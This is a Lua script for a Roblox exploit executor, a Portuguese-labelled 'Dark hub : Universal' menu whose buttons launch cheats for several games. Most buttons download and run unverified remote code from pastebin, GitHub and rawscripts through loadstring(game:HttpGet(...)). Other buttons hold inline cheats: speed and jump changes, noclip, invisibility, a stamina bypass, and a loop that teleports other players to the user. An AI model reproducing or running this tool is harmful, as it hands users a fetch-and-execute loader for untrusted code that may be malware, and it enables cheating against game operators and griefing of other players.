local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/PlockScripts/Library-ui/refs/heads/main/Redzhubui"))()
local Window = redzlib:MakeWindow({
  Title = "Dark hub : Universal",
  SubTitle = "by davidgames3d",
  SaveFolder = "testando | redz lib v5.lua"
})
local Tab1 = Window:MakeTab({"main", "main"})

Window:AddMinimizeButton({
    Button = { Image = "rbxassetid://18567654092", BackgroundTransparency = 0 },
    Corner = { CornerRadius = UDim.new(35, 1) },
})

  local Dialog = Window:Dialog({
    Title = "bem-vindo(a) ",
    Text = "vÃ¡ para o canal dos Criadores no YouTube ou vÃ¡ no server para nÃ³s ajudar",
    Options = {
      {"Confirmar", function()
        
      end},
      {"obrigado", function()

      end},
      {"depois", function()
 
      end}
    }
  })

Tab1:AddDiscordInvite({
    Name = "davidgames3d server",
    Description = "Junte-se a nÃ³s",
    Logo = "rbxassetid://6604011398",
    Invite = "https://discord.gg/5NemTTmCBx",
})

local Paragraph = Tab1:AddParagraph({"aviso", "entre no nosso server para novos scripts e vÃ­deos no YouTube para ajudar o criador"})

Tab1:AddSlider({
  Name = "Speed",
  Min = 1,
  Max = 300,
  Increase = 1,
  Default = 16,
  Callback = function(Value)
      -- Pega o personagem local
      local player = game.Players.LocalPlayer
      local character = player.Character or player.CharacterAdded:Wait()
      local humanoid = character:FindFirstChildOfClass("Humanoid")

      if humanoid then
          humanoid.WalkSpeed = Value -- muda a velocidade para o valor do slider
      end
  end
})

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

Tab1:AddSlider({
    Name = "Jump Power",
    Min = 10,
    Max = 200,
    Increase = 1,
    Default = 50,
    Callback = function(Value)
        humanoid.JumpPower = Value
    end
})

local Tab1 = Window:MakeTab({"universalðŸŒ", "universalðŸŒ"})

Tab1:AddButton({"c00lkidd", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/MYsVtALF"))()
print("Hello World!")
end})

Tab1:AddButton({"c00lgui v1", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Angelo-Gitland/c00lkidd-Gui-V1-By-Lua-land/refs/heads/main/c00lkidd%20Gui%20V1%20By%20Lua%20Land"))()
print("Hello World!")
end})

Tab1:AddButton({"c00lgui rework", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-C00lgui-Rework-46970"))()
print("Hello World!")
end})

Tab1:AddButton({"fearless gui", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/synkixr/FEARLESS-GUI/refs/heads/main/fearless-gui-by-synkixr"))()
print("Hello World!")
end})

Tab1:AddButton({"raid hub", function(Value)
loadstring(game:HttpGet('https://pastebin.com/raw/TPBeBqmC'))()
print("Hello World!")
end})

Tab1:AddButton({"forsaken/mm2", function(Value) loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
print("Hello World!")
end})

Tab1:AddButton({"invisivel fe", function(Value)
print("Hello World!")
end})
--[[Invisibility Toggle

You can find the orginal concept here: https://v3rmillion.net/showthread.php?tid=544634

This method clones the character locally, teleports the real character to a safe location, then sets the character to the clone.
Basically, your real character is in the sky while you are on the ground.


Because of the way this works, games with a decent anti-cheat will fck this up.
If you turn it off, you have to go to a safe place before going invisible.

Written by: BitingTheDust ; https://v3rmillion.net/member.php?action=profile&uid=1628149
]]
--Settings:
local ScriptStarted = false
local Keybind = "E" --Set to whatever you want, has to be the name of a KeyCode Enum.
local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
local NoClip = false --Will make your fake character no clip.

local Player = game:GetService("Players").LocalPlayer
local RealCharacter = Player.Character or Player.CharacterAdded:Wait()

local IsInvisible = false

RealCharacter.Archivable = true
local FakeCharacter = RealCharacter:Clone()
local Part
Part = Instance.new("Part", workspace)
Part.Anchored = true
Part.Size = Vector3.new(200, 1, 200)
Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
Part.CanCollide = true
FakeCharacter.Parent = workspace
FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

for i, v in pairs(RealCharacter:GetChildren()) do
  if v:IsA("LocalScript") then
      local clone = v:Clone()
      clone.Disabled = true
      clone.Parent = FakeCharacter
  end
end
if Transparency then
  for i, v in pairs(FakeCharacter:GetDescendants()) do
      if v:IsA("BasePart") then
          v.Transparency = 0.7
      end
  end
end
local CanInvis = true
function RealCharacterDied()
  CanInvis = false
  RealCharacter:Destroy()
  RealCharacter = Player.Character
  CanInvis = true
  isinvisible = false
  FakeCharacter:Destroy()
  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid

  RealCharacter.Archivable = true
  FakeCharacter = RealCharacter:Clone()
  Part:Destroy()
  Part = Instance.new("Part", workspace)
  Part.Anchored = true
  Part.Size = Vector3.new(200, 1, 200)
  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
  Part.CanCollide = true
  FakeCharacter.Parent = workspace
  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

  for i, v in pairs(RealCharacter:GetChildren()) do
      if v:IsA("LocalScript") then
          local clone = v:Clone()
          clone.Disabled = true
          clone.Parent = FakeCharacter
      end
  end
  if Transparency then
      for i, v in pairs(FakeCharacter:GetDescendants()) do
          if v:IsA("BasePart") then
              v.Transparency = 0.7
          end
      end
  end
 RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
 Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
end
RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
local PseudoAnchor
game:GetService "RunService".RenderStepped:Connect(
  function()
      if PseudoAnchor ~= nil then
          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
      end
       if NoClip then
      FakeCharacter.Humanoid:ChangeState(11)
       end
  end
)

PseudoAnchor = FakeCharacter.HumanoidRootPart
local function Invisible()
  if IsInvisible == false then
      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
      RealCharacter.Humanoid:UnequipTools()
      Player.Character = FakeCharacter
      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
      PseudoAnchor = RealCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = false
          end
      end

      IsInvisible = true
  else
      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
     
      RealCharacter.HumanoidRootPart.CFrame = StoredCF
     
      FakeCharacter.Humanoid:UnequipTools()
      Player.Character = RealCharacter
      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
      PseudoAnchor = FakeCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = true
          end
      end
      IsInvisible = false
  end
end

game:GetService("UserInputService").InputBegan:Connect(
  function(key, gamep)
      if gamep then
          return
      end
      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
              Invisible()
          end
      end
  end
)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})

Tab1:AddButton({"aim bot universal", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Volcano-universal-aimbot-36995"))()
print("Hello World!")
end})

Tab1:AddButton({"player emote", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Emotes-Player-and-Catalog-Searcher-52056"))()
print("Hello World!")
end})

Tab1:AddButton({"painel HD admin", function(Value)
 loadstring(game:HttpGet("https://pastebin.com/raw/KMp8Jvsa",true))() ----------- Intro GUI

local Player = game.Players.LocalPlayer ------------- START OF SCRIPT

Player.Chatted:connect(function(cht)         ----------- CMD SMART
	if cht:match(":cmd") then 
		loadstring(game:HttpGet("https://pastebin.com/raw/M3tZZAqa",true))()
	elseif cht:match(":toolgui") then                                -------------------- TOOL GUI PART / END OF CMD
		
	loadstring(game:HttpGet("https://pastebin.com/raw/txadLpTy",true))()
	
	elseif cht:match(":savetool") then
			for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if (v:IsA("Tool")) then
v.Parent = game.Players.LocalPlayer
end
			end
	elseif cht:match(":loadtool") then
		for _,v in pairs(game.Players.LocalPlayer:GetChildren()) do
if (v:IsA("Tool")) then
v.Parent = game.Players.LocalPlayer.Backpack
end
		end
	elseif cht:match(":antiafk") then  --------------------------------- END OF TOOL GUI PART
		local VirtualUser=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)
		
					        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Loaded";
            Text = "Anti AFK Script";
			        })
		
	elseif cht:match(":blockhead") then
		game.Players.LocalPlayer.Character.Head.Mesh:destroy()
	elseif cht:match(":creeper6") then
		game.Players.LocalPlayer.Character.Head.Mesh:destroy()
function doo(limb, pos)
limb:BreakJoints()
local velocity = Instance.new("RocketPropulsion", limb)
velocity.CartoonFactor = 0
velocity.MaxSpeed = 30
velocity.MaxThrust = 9999
velocity.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
velocity.Target = game.Players.LocalPlayer.Character.Torso
velocity.TargetOffset = pos
velocity:fire()
local b = Instance.new("BodyGyro", limb)
end
while wait() do
doo(game.Players.LocalPlayer.Character["Left Arm"], Vector3.new(-0.5,-2,-1))
doo(game.Players.LocalPlayer.Character["Right Arm"], Vector3.new(0.5,-2,-1))
doo(game.Players.LocalPlayer.Character["Left Leg"], Vector3.new(-0.5,-2,1))
doo(game.Players.LocalPlayer.Character["Right Leg"], Vector3.new(0.5,-2,1))
end
	elseif cht:match(":creeper15") then
		game.Players.LocalPlayer.Character.Head.Mesh:destroy()
function doo(limb, pos)
limb:BreakJoints()
local velocity = Instance.new("RocketPropulsion", limb)
velocity.CartoonFactor = 0
velocity.MaxSpeed = 30
velocity.MaxThrust = 9999
velocity.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
velocity.Target = game.Players.LocalPlayer.Character.UpperTorso
velocity.TargetOffset = pos
velocity:fire()
local b = Instance.new("BodyGyro", limb)
end
while wait() do
doo(game.Players.LocalPlayer.Character["LeftUpperArm"], Vector3.new(-0.5,-2,-1))
doo(game.Players.LocalPlayer.Character["RightUpperArm"], Vector3.new(0.5,-2,-1))
doo(game.Players.LocalPlayer.Character["LeftUpperLeg"], Vector3.new(-0.5,-2,1))
doo(game.Players.LocalPlayer.Character["RightUpperLeg"], Vector3.new(0.5,-2,1))
end
	elseif cht:match(":shattervest") then
		loadstring(game:HttpGet("https://pastebin.com/raw/CKbPg9NC", true))()
	elseif cht:match(":animationgui") then
		loadstring(game:HttpGet("https://pastebin.com/raw/uUR6pFVv", true))()
	elseif cht:match(":gabx") then
		loadstring(game:HttpGet("https://pastebin.com/raw/EntUzD5J", true))();
	elseif cht:match(":clickdel") then
		local Plr = game:GetService("Players").LocalPlayer
local Mouse = Plr:GetMouse()

Mouse.Button1Down:connect(function()
if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then return end
if not Mouse.Target then return end
Mouse.Target:Destroy()
end)
		
	elseif cht:match(":trollinggui") then
		loadstring(game:HttpGet("https://pastebin.com/raw/RNWgaqCE", true))()
	elseif cht:match(":infinitejump") then
		local Player = game:GetService'Players'.LocalPlayer;
local UIS = game:GetService'UserInputService';

_G.JumpHeight = 50;

function Action(Object, Function) if Object ~= nil then Function(Object); end end

UIS.InputBegan:connect(function(UserInput)
    if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
        Action(Player.Character.Humanoid, function(self)
            if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                Action(self.Parent.HumanoidRootPart, function(self)
                    self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                end)
            end
        end)
    end
end)
	elseif cht:match(":opfianlity") then
		loadstring(game:HttpGet("https://pastebin.com/raw/w8HNfSWA", true))();
	elseif cht:match(":aimbot1") then
		loadstring(game:HttpGet("https://pastebin.com/raw/2kbyfrn5", true))()
	elseif cht:match("aimbot2") then
		loadstring(game:HttpGet("https://pastebin.com/raw/xB92ES44", true))()
	elseif cht:match("aimbotgui") then
		loadstring(game:HttpGet("https://pastebin.com/raw/uw2P2fbY", true))()
		
	elseif cht:match(":openui") then  -- secret script if you open the pastebin :))
		loadstring(game:HttpGet("https://pastebin.com/raw/F9USVzSK",true))()
	end
end)

------------------------------------------------------------------------------- END OF SCRIPT ------------------------------------------------------------------


loadstring(game:HttpGet("https://pastebin.com/raw/F9USVzSK",true))()

			        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Loaded";
            Text = "Ultimate Admin Script";
			        })
			
			print("Working Admin Script")
print("Hello World!")
end})

Tab1:AddButton({"admin require", function(Value)
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
require(7192763922).load("playername")
print("Hello World!")
end})

Tab1:AddButton({"C00LGUI", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/apanel", true))()
print("Hello World!")
end})

Tab1:AddButton({"F3X", function(Value)
loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
print("Hello World!")
end})

Tab1:AddButton({"BTools", function(Value)
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
print("Hello World!")
end})

Tab1:AddButton({"Noclip", function(Value)
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false

Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui

BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true

Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0

Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0

StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true

Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left


Toggle.MouseButton1Click:connect(function()
	if Status.Text == "off" then
		Clipon = true
		Status.Text = "on"
		Status.TextColor3 = Color3.new(0,185,0)
		Stepped = game:GetService("RunService").Stepped:Connect(function()
			if not Clipon == false then
				for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
			else
				Stepped:Disconnect()
			end
		end)
	elseif Status.Text == "on" then
		Clipon = false
		Status.Text = "off"
		Status.TextColor3 = Color3.new(170,0,0)
	end
end)
print("Hello World!")
end})

Tab1:AddButton({"FLY GUI V3", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
print("Hello World!")
end})

Tab1:AddButton({"hoho hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-HoHo-Hub-29869"))()
print("Hello World!")
end})

Tab1:AddButton({"remainshub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemainsHub-V3-51691"))()
print("Hello World!")
end})

Tab1:AddButton({"admin panel", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Admin-Panel-53076"))()
print("Hello World!")
end})

Tab1:AddButton({"infinite Yield", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-43437"))()
print("Hello World!")
end})

Tab1:AddButton({"ghost hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ghost-Hub-27383"))()
print("ghost Hub")
end})

Tab1:AddButton({"david gui", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/davidgames3d/Script-roblox/main/DAVIDGUI.lua"))()
print("david gui")
end})

Tab1:AddButton({"david hub v8", function(Value)
loadstring(game:HttpGet("https://github.com/davidgames3d/Script-roblox/blob/main/David_hub_v8.lua",true))()
print("david hub")
end})

Tab1:AddButton({"r15 para r6", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R15-to-r6-script-working-all-game-26416"))()
print("r15 to r6")
end})

Tab1:AddButton({"c00lkiddgui", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/davidgames3d/Script-roblox/main/c00lkiddHUB.lua"))()
print("c00lkidd")
end})

Tab1:AddButton({"admin troll", function(Value) loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Private-gui-by-hanif-leak-40943"))()
print("gui admin")
end})

Tab1:AddButton({"tiger hub x v4", function(Value) 
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Tiger-hub-x-v4-42180"))()
print("tiger hub")
end})   

Tab1:AddButton({"afem Animation pack", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-14048"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"brookhavenðŸ¡", "brookhavenðŸ¡"})

Tab1:AddButton({"sander xy", function(Value) 
loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-Sander-XY-35845"))()
print("Hello World!")
end})

Tab1:AddButton({"cartola hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Davi999z/Cartola-Hub/refs/heads/main/Brookhaven",true))()
print("cartola hub")
end}) 

Tab1:AddButton({"antares hub original", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/BorisLua/AntaresHubSuaMaeNaMinhaCama/refs/heads/main/AntaresHubWorking.lua"))()
print("2024 voltemo")
end})

Tab1:AddButton({"zynora hub", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/PwyJLxeJ"))()
print("Hello World!")
end})

Tab1:AddButton({"bring all", function(Value)
-- Simple Bring All GUI with Enable/Disable Toggle
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local bringEnabled = false
local bringLoop

-- GUI Setup
local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.Name = "BringAllGUI"

local enableButton = Instance.new("TextButton", screenGui)
enableButton.Size = UDim2.new(0, 200, 0, 50)
enableButton.Position = UDim2.new(0.5, -100, 0.4, 0)
enableButton.Text = "Enable Bring All"
enableButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

local disableButton = Instance.new("TextButton", screenGui)
disableButton.Size = UDim2.new(0, 200, 0, 50)
disableButton.Position = UDim2.new(0.5, -100, 0.5, 0)
disableButton.Text = "Disable Bring All"
disableButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)

-- Bring function
local function bringPlayers()
    bringLoop = task.spawn(function()
        while bringEnabled do
            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if root then
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local theirRoot = player.Character.HumanoidRootPart
                        theirRoot.CFrame = root.CFrame + Vector3.new(math.random(-5, 5), 1, math.random(-5, 5))
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

-- Button callbacks
enableButton.MouseButton1Click:Connect(function()
    if not bringEnabled then
        bringEnabled = true
        bringPlayers()
    end
end)

disableButton.MouseButton1Click:Connect(function()
    bringEnabled = false
    if bringLoop then
        task.cancel(bringLoop)
    end
end)
print("Hello World!")
end})

Tab1:AddButton({"soluna hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Patheticcs/Soluna-API/refs/heads/main/brookhaven.lua",true))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"dandy worldðŸ§¸", "dandy worldðŸ§¸"})

Tab1:AddButton({"G0bbyD0llan", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/FBRnb7S7"))()
print("Hello World!")
end})

Tab1:AddButton({"soup hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Soup182/Soup-Hub-Dandy-s-World-Hub-/refs/heads/main/Dw%20Soup%20Hub.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"aussie wire", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/9xvD1pig", true))()
print("Hello World!")
end})

Tab1:AddButton({"abraÃ§o hub?", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/BobJunior1/Sup/refs/heads/main/Bobhub"))()
print("Hello World!")
end})

Tab1:AddButton({"astral hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/StarlessScripts/Astral-Dandy-s-world/refs/heads/main/Starless"))()
print("Hello World!")
end})

Tab1:AddButton({"dandy World mobile", function(Value)
loadstring(game:HttpGet("https://pastebin.com/raw/Y7uh3UZf"))();
print("Hello World!")
end})

Tab1:AddButton({"dandy World gui", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/main/Dandy"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"forsakenðŸš", "forsakenðŸš"})

Tab1:AddButton({"forsaken spy", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/rafaijaved/Roblox-Scripts-Keysystems/refs/heads/main/ForsakenESP.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"forsaken script", function(Value)
loadstring(game:HttpGet('https://raw.githubusercontent.com/Ali312809/Scripts/refs/heads/main/forsakenscript.lua'))()
print("Hello World!")
end})

Tab1:AddButton({"Minimalistic Forsaken", function(Value)
local StaminaModule = require(game.ReplicatedStorage.Systems.Character.Game.Sprinting)

StaminaModule.StaminaLossDisabled = true
task.spawn(function()
	while true do
		task.wait(0.1)
		StaminaModule.Stamina = StaminaModule.MaxStamina
		StaminaModule.StaminaChanged:Fire()
	end
end)
print("Hello World!")
end})

Tab1:AddButton({"funny hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Forsaken-Funny-Hub-V2-42056"))()
print("Hello World!")
end})

Tab1:AddButton({"rift forsaken", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Slasher-Forsaken-gi-51733"))()
print("Hello World!")
end}) 

Tab1:AddButton({"atherhub forsaken", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Slasher-Forsaken-Atherhub-Forsaken-OVERPOWERED-AUTO-GENERATOR-AND-SPEED-51096"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"roube um brainrotðŸ§ ðŸª", "roube um brainrotðŸ§ ðŸª"})

Tab1:AddButton({"steal a brainrot script", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/StealaBrainrot", true))()
print("Hello World!")
end})

Tab1:AddButton({"op auto all", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/OverflowBGSI/Overflow/refs/heads/main/loader.txt"))()
print("Hello World!")
end})

Tab1:AddButton({"the best hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/KaspikScriptsRb/steal-a-brainrot/refs/heads/main/.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"brainrot auto farm", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/m00ndiety/Steal-a-brainrot/refs/heads/main/Steal-a-Brainrot"))()
print("Hello World!")
end})

Tab1:AddButton({"ronix hub", function(Value)
loadstring(game:HttpGet("pastebin.com/raw/HFx6faQY"))()
print("Hello World!")
end})

Tab1:AddButton({"rift hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Steal-a-Brainrot-b-51993"))()
print("Hello World!")
end})

Tab1:AddButton({"6 7 hub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Steal-a-Brainrot-67-BEST-GUI-AUTO-53128"))()
print("Hello World!")
end})

Tab1:AddButton({"atherhub", function(Value)
loadstring(game:HttpGet("https://rawscripts.net/raw/Steal-a-Brainrot-Atherhub-Steal-a-Brainrot-OP-50682"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"blox fruitðŸŽ", "blox fruitðŸŽ"})

Tab1:AddButton({"raito hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Efe0626/RaitoHub/main/Script"))()
print("Hello World!")
end})

Tab1:AddButton({"speed hub x", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"redz hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaCrack/Min/refs/heads/main/MinXt2Eng"))()
print("Hello World!")
end})

Tab1:AddButton({"banana hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nghia11n/Banana-Hub/main/bananahub.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"w azure hub", function(Value)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"min hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/JonnyCheeser/bloxfruits/main/minhubv4"))()
print("Hello World!")
end})

Tab1:AddButton({"aurora", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jadelly261/BloxFruits/main/Aurora", true))()
print("Hello World!")
end})

Tab1:AddButton({"hoho hub", function(Value)
loadstring(game:HttpGet('https://raw.githubusercontent.com/ascn123/HOHO_H/main/Loading_UI'))()
print("Hello World!")
end})

Tab1:AddButton({"cokka hub", function(Value)
loadstring(game:HttpGet"https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua")()
print("Hello World!")
end})

Tab1:AddButton({"annie hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Anniecuti/Free-Scr/main/Annie-Hub.lua"))()
print("Hello World!")
end})

local Tab1 = Window:MakeTab({"99 noites na florestaðŸŒ²", "99 noites na florestaðŸŒ²"})

Tab1:AddButton({"darkESC hub", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkenedEssence/DarkEsc/refs/heads/main/Loader.lua"))()
print("Hello World!")
end})

Tab1:AddButton({"SkyBase HubðŸ—", function(Value)
loadstring(game:HttpGet("https://raw.githubusercontent.com/nouralddin-abdullah/99-night/refs/heads/main/main-en.lua"))()
print("Hello World!")
end})

